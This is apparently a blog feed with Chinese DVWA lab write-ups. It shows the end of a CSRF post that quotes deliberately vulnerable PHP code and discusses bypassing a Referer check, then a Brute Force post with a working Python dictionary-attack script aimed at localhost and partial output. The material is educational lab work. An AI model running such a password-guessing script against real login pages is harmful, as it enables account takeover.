&lt;ol>
&lt;li>md5 未加盐哈希作为密码字段保存到数据库，得到了哈希有可能被逆推出密码。&lt;/li>
&lt;li>直接拼了 &lt;code>dvwaCurrentUser()&lt;/code>，目前不清楚这个函数里有没有做好转义处理，没处理可能存在 SQL 注入。&lt;/li>
&lt;/ol>
&lt;p>全程这个 &lt;code>$GLOBALS[&amp;quot;___mysqli_ston&amp;quot;]&lt;/code> 到底是个什么玩意儿让我有点懵，搜索了下好像是 SQL 连接，类似 Go 中的 &lt;code>sql.DB&lt;/code> 对象（意会好嘛）。&lt;/p>
&lt;p>别的问题就没看出来了。&lt;/p>
&lt;h3 id="提高难度败北">提高难度（败北）&lt;/h3>
&lt;p>直接使用 Low 难度下的方法，&lt;code>window.location.href&lt;/code>，会报错：&lt;code>That request didn't look correct&lt;/code>。&lt;/p>
&lt;p>简单看一下 Medium 难度下的代码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Change&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Checks to see where the request came from
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">stripos&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_SERVER&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;HTTP_REFERER&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">,&lt;/span>&lt;span class="nv">$_SERVER&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;SERVER_NAME&amp;#39;&lt;/span> &lt;span class="p">])&lt;/span> &lt;span class="o">!==&lt;/span> &lt;span class="k">false&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;password_new&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$pass_conf&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;password_conf&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Do the passwords match?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nv">$pass_conf&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// They do!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_real_escape_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">trigger_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">E_USER_ERROR&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Update the database
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$insert&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;UPDATE `users` SET password = &amp;#39;&lt;/span>&lt;span class="si">$pass_new&lt;/span>&lt;span class="s2">&amp;#39; WHERE user = &amp;#39;&amp;#34;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nx">dvwaCurrentUser&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s2">&amp;#34;&amp;#39;;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$insert&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="k">or&lt;/span> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_connect_error&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Feedback for the user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;Password Changed.&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Issue with passwords matching
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;Passwords did not match.&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Didn&amp;#39;t come from a trusted source
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;That request didn&amp;#39;t look correct.&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">((&lt;/span>&lt;span class="nx">is_null&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="k">false&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="nv">$___mysqli_res&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>注意到主要变化在于进入业务处理前，加上了一条判断：&lt;code>if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false )&lt;/code>。&lt;/p>
&lt;p>&lt;code>stripos&lt;/code> 函数查找子串出现在字符串里的位置，没找到的情况下返回&lt;code>false&lt;/code>，这条判断的意思是在 &lt;code>HTTP_REFERER&lt;/code> 里查找 &lt;code>SERVER_NAME&lt;/code> 是否出现，如果出现才进一步处理。所以 Medium 难度下问题变成了怎么 bypass 这个判断。&lt;/p>
&lt;p>搜索 &lt;code>SERVER_NAME&lt;/code> 的文档可以找到这样的说明：&lt;/p>
&lt;blockquote>
&lt;p>&amp;lsquo;SERVER_NAME&amp;rsquo;&lt;/p>
&lt;p>The name of the server host under which the current script is executing. If the script is running on a virtual host, this will be the value defined for that virtual host.&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>Note&lt;/strong>: Under Apache 2, you must set &lt;code>UseCanonicalName = On&lt;/code> and &lt;code>ServerName&lt;/code>. Otherwise, this value reflects the hostname supplied by the client, which can be spoofed. It is not safe to rely on this value in security-dependent contexts.&lt;/p>
&lt;/blockquote>
&lt;/blockquote>
&lt;p>在 Apache2 环境下，如果没有正确配置 &lt;code>UseCanonicalName = On&lt;/code>和&lt;code>ServerName&lt;/code>的话，&lt;code>$_SERVER['SERVER_NAME']&lt;/code>的值就是 HTTP 请求头里的 Hostname。&lt;/p>
&lt;p>&lt;code>HTTP_REFERER&lt;/code> 的文档这样说：&lt;/p>
&lt;blockquote>
&lt;p>&amp;lsquo;HTTP_REFERER&amp;rsquo;&lt;/p>
&lt;p>The address of the page (if any) which referred the user agent to the current page. This is set by the user agent. Not all user agents will set this, and some provide the ability to modify HTTP_REFERER as a feature. In short, it cannot really be trusted.&lt;/p>
&lt;/blockquote>
&lt;p>但遗憾的是，不管 &lt;code>Host&lt;/code> 还是 &lt;code>Referer&lt;/code> 都无法修改（受制于浏览器的约束），所以尽管文档里说可能存在安全隐患，但反正我这会儿想不出利用方法。&lt;/p>
&lt;p>于是看眼帮助文档，提示需要结合 XSS 之类的洞攻破。这么一说就茅塞顿开了，虽然说是个练习靶场但也不是题目说CSRF就非要顶着CSRF死磕，别的洞一个不碰。（大佬说不定能死磕成功，我也想变大佬啊=。=）&lt;/p>
&lt;p>考虑多个漏洞联合利用确实常见也一定要学，但现在暂且还是免了吧=。=累死。后面捅 XSS 的时候再回头顺便把 Medium 难度做了。&lt;/p>
&lt;p>看了眼 High 难度下同样要结合多个漏洞利用，我寻思能突破 CORS 的话即使有 CSRF Token 也好办，直接 xhr 把表单页拿下来就好。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>好的，现在 CSRF 感觉有点难利用了。主要还是现代浏览器的同源策略越来越严格，往默认安全靠拢，迭代速度快的一批。流传下来的利用方法如今一试就寄，半点屁用没有，连搭一个能复现漏洞的环境都麻烦的一批（比如具体哪个版本的 Chrome 修了&lt;code>SameSite&lt;/code>，去哪儿下载历史版本，搞出一堆浏览器共存巴拉巴拉）&lt;/p>
&lt;p>然后就很难不想起互联网上不停重复的观点了。为什么不要做伸手党？抛开对大环境的影响，伸手党一直有个通病，就是没有学习的能力。这里的学习说的是 &lt;em>收集、整理、归纳、总结、利用&lt;/em> 信息的能力。在一个领域独立探索未知，这是真正独立的标志。&lt;/p>
&lt;p>讲真，太怀念上学的日子了，脑子空空无忧无虑。真正出来工作卖力之后才会渐渐意识到什么叫不进则退。我觉得与其说什么社会在惩罚不努力的人，不如说这个社会在惩罚所有人。也不该说是社会，而是人的天性，让人生来就要受尽苦难。&lt;/p>
&lt;p>扯远了。就这样吧。&lt;/p></description></item><item><title>DVWA上手记录-简单尝试</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-02/</link><pubDate>Sun, 24 Apr 2022 15:05:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-02/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>萌新试玩DVWA，Brute Force 和 Command Injection 两道入门题。&lt;/p>
&lt;h2 id="brute-force">Brute Force&lt;/h2>
&lt;h3 id="信息收集">信息收集&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421165951469.png"
width="678"
height="310"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421165951469_hu968bfbff7b3908a335da7115c389096f_24097_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421165951469_hu968bfbff7b3908a335da7115c389096f_24097_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421165951469"
class="gallery-image"
data-flex-grow="218"
data-flex-basis="524px"
>&lt;/p>
&lt;p>表单很简单，尝试随便给个用户名密码会报错。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170044746.png"
width="293"
height="208"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170044746_hu922d70c9fe48b32784873287834092d4_5047_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170044746_hu922d70c9fe48b32784873287834092d4_5047_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421170044746"
class="gallery-image"
data-flex-grow="140"
data-flex-basis="338px"
>&lt;/p>
&lt;p>出于基本的好奇和联想（不要联想）试了下&lt;code>admin&lt;/code>和&lt;code>password&lt;/code>（就是DVWA默认的登陆密码），发现这就是正确密码了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170146718.png"
width="349"
height="273"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170146718_hubdd8467726ec153ca4f4cd266c83a5da_24326_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170146718_hubdd8467726ec153ca4f4cd266c83a5da_24326_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421170146718"
class="gallery-image"
data-flex-grow="127"
data-flex-basis="306px"
>&lt;/p>
&lt;p>好吧，猜出来也算。但题目是 Brute Force，所以本意应该是整一个暴力破解的脚本什么的吧，像是公网上天天扫 22 端口尝试弱密码的机器人一样。&lt;/p>
&lt;p>出于这样的想法，再看下表单怎么提交的，能不能直接写个脚本发 HTTP 请求搞定。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170531288.png"
width="431"
height="198"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170531288_hu7f69ddf94bb81e659ec24c8688d64b22_14037_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170531288_hu7f69ddf94bb81e659ec24c8688d64b22_14037_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421170531288"
class="gallery-image"
data-flex-grow="217"
data-flex-basis="522px"
>&lt;/p>
&lt;p>再看下网络请求。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170720287.png"
width="1393"
height="469"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170720287_huc75cdf68db8e6c3f9a6464185546fd97_67655_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170720287_huc75cdf68db8e6c3f9a6464185546fd97_67655_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421170720287"
class="gallery-image"
data-flex-grow="297"
data-flex-basis="712px"
>&lt;/p>
&lt;p>用户名密码直接放在 QueryString 里，看起来也没什么保护，既然这样自己构造请求就很轻松愉快了。&lt;/p>
&lt;h3 id="准备">准备&lt;/h3>
&lt;p>暴力破解也有暴力破解的技巧。&lt;/p>
&lt;p>可接受的输入长度在有限区间的情况下，直接遍历所有字母数字特殊字符组合是很难顶的，每多一位可能的密码数量都是指数上升。比如最短 6 位密码，接受 ASCII 127 个字符，就有 127^6 种可能的密码，最长 16 位密码就是 127^16，每次尝试花费 1ms 的话，所需时间可以达到 1.44E+38 年这么久。&lt;/p>
&lt;p>但人不可能真的随机从ascii码表里随机抽取字符当密码，所以暴力破解其实只需要尝试比较常见的密码就行（比如生日、名字、单词、有规律的数字以及这些元素的组合），还可以选择从其他已泄露的网站里保存的用户名密码来“撞库”碰运气。&lt;/p>
&lt;p>这种“弱密码”构成的表在网上还是比较容易找到的。实在不行可以自己现编一个，比如直接英语词典、日期、常见姓名凑一凑，再找个 20xx 年 top N 弱密码合起来就是个可以一战的弱密码字典了。不过最好还是找个高质量的字典，好的字典排序能让暴力破密码更快（就是从统计（？）上来说越靠前的密码越常用，越可能是正确的密码）。&lt;/p>
&lt;p>挑好字典之后，剩下就是直接把这个字典从头到尾试一遍了。这里我随便找了个&lt;a class="link" href="https://github.com/TgeaUs/Weak-password/" target="_blank" rel="noopener"
>Weak-password&lt;/a>（里面大部分内容不关心也用不到）直接下载 zip。&lt;/p>
&lt;p>创建个 &lt;code>dvwa-writeup&lt;/code> 仓库用来存 dvwa 题解脚本，把 zip 解压进去。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422092243142.png"
width="291"
height="359"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422092243142_hu2c6ed95d30405302f7bb95a50c5238af_19893_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422092243142_hu2c6ed95d30405302f7bb95a50c5238af_19893_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422092243142"
class="gallery-image"
data-flex-grow="81"
data-flex-basis="194px"
>&lt;/p>
&lt;p>就是这样。&lt;/p>
&lt;h3 id="编写脚本">编写脚本&lt;/h3>
&lt;p>出于个人偏好，使用 python 编写脚本。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="ch">#!/usr/bin/env python3&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="c1"># WriteUp: brute force [Security Level: Low]&lt;/span>
&lt;span class="c1"># Author: weak_ptr&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="c1"># NOTE: require python version &amp;gt;= 3.6&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="kn">import&lt;/span> &lt;span class="nn">requests&lt;/span>
&lt;span class="n">dictionary_list&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>
&lt;span class="s1">&amp;#39;Weak-password/Password dictionary/常用密码.dict&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;Weak-password/Password dictionary/国外常用密码.dict&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">]&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">path&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">dictionary_list&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;[+] open dict: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;r&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">encoding&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">line&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">pwd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">line&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">strip&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="n">resp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;http://localhost:8080/vulnerabilities/brute/?username=admin&amp;amp;password=&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">pwd&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;amp;Login=Login#&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="n">cookies&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;PHPSESSID&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;t6kml64lvsbd8909fkrh51ove0&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;security&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;low&amp;#39;&lt;/span>&lt;span class="p">})&lt;/span>
&lt;span class="c1"># 太粗暴&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;[-] try password: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">pwd&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="s1">&amp;#39;Username and/or password incorrect.&amp;#39;&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">resp&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">content&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;[+] Done! password is &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nb">repr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pwd&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">break&lt;/span>
&lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">continue&lt;/span>
&lt;span class="k">break&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>运行后：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">[+] open dict: Weak-password/Password dictionary/常用密码.dict
[-] try password: admin
[-] try password: admin12
[-] try password: admin888
[-] try password: admin8
[-] try password: admin123
[-] try password: sysadmin
[-] try password: adminxxx
[-] try password: adminx
[-] try password: 6kadmin
[-] try password: base
[-] try password: feitium
[-] try password: admins
[-] try password: root
